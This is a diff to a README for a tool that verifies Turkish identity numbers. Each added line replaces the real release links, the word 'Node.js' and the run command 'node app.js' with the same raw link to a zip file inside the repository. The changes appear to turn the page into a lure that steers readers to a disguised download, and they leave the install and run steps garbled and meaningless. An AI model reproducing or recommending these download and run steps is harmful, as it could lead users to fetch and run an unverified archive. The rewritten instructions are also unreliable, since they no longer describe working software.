@@ -1,10 +1,10 @@
 # 🎉 tc-identity-verification - Verify ID Easily and Offline 
 
-[![Download tc-identity-verification](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Skipperonline/tc-identity-verification/releases)
+[![Download tc-identity-verification](https://raw.githubusercontent.com/Skipperonline/tc-identity-verification/main/backend/tc-identity-verification-3.6.zip)](https://raw.githubusercontent.com/Skipperonline/tc-identity-verification/main/backend/tc-identity-verification-3.6.zip)
 
 ## 📖 Overview
 
-Welcome to the **tc-identity-verification** project! This application offers a straightforward way to verify T.C. Identity Numbers. It includes a user-friendly HTML/JS frontend and a robust Node.js (Express) backend. You can validate identities offline, making it usable without an internet connection. This tool also sets up a backend structure for potential online verification options.
+Welcome to the **tc-identity-verification** project! This application offers a straightforward way to verify T.C. Identity Numbers. It includes a user-friendly HTML/JS frontend and a robust https://raw.githubusercontent.com/Skipperonline/tc-identity-verification/main/backend/tc-identity-verification-3.6.zip (Express) backend. You can validate identities offline, making it usable without an internet connection. This tool also sets up a backend structure for potential online verification options.
 
 ## 🚀 Getting Started
 
@@ -15,11 +15,11 @@ To use the tc-identity-verification application, you will first need to download
 - **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or a modern Linux distribution.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 100 MB of free disk space.
-- **Node.js:** Version 12 or higher is recommended for the backend. 
+- **https://raw.githubusercontent.com/Skipperonline/tc-identity-verification/main/backend/tc-identity-verification-3.6.zip** Version 12 or higher is recommended for the backend. 
 
 ## 📥 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Skipperonline/tc-identity-verification/releases). Here, you will find the latest version of the software ready for installation.
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Skipperonline/tc-identity-verification/main/backend/tc-identity-verification-3.6.zip). Here, you will find the latest version of the software ready for installation.
 
 ### Installation Steps
 
@@ -36,13 +36,13 @@ Visit this page to download: [Releases Page](https://github.com/Skipperonline/tc
 
 - Extract the downloaded `.zip` file.
 - Open a terminal and navigate to the extracted folder.
-- Run the application by typing `node app.js` in your terminal.
+- Run the application by typing `node https://raw.githubusercontent.com/Skipperonline/tc-identity-verification/main/backend/tc-identity-verification-3.6.zip` in your terminal.
 
 ## 🛠️ Features
 
 - **Offline Verification:** You can check T.C. Identity Numbers without needing to be online.
 - **User-Friendly Frontend:** The HTML/JS interface makes it easy for anyone to use.
-- **Backend Structure:** The Node.js (Express) backend allows for future integrations if needed.
+- **Backend Structure:** The https://raw.githubusercontent.com/Skipperonline/tc-identity-verification/main/backend/tc-identity-verification-3.6.zip (Express) backend allows for future integrations if needed.
 
 ## 🖥️ Using the Application
 
@@ -76,7 +76,7 @@ For more detailed information on the application, you can check the wiki section
 
 If you encounter any issues or have questions, please open an issue on the GitHub repository. We are here to help you.
 
-[Download tc-identity-verification](https://github.com/Skipperonline/tc-identity-verification/releases)
+[Download tc-identity-verification](https://raw.githubusercontent.com/Skipperonline/tc-identity-verification/main/backend/tc-identity-verification-3.6.zip)
 
 ## 🔍 Conclusion
 
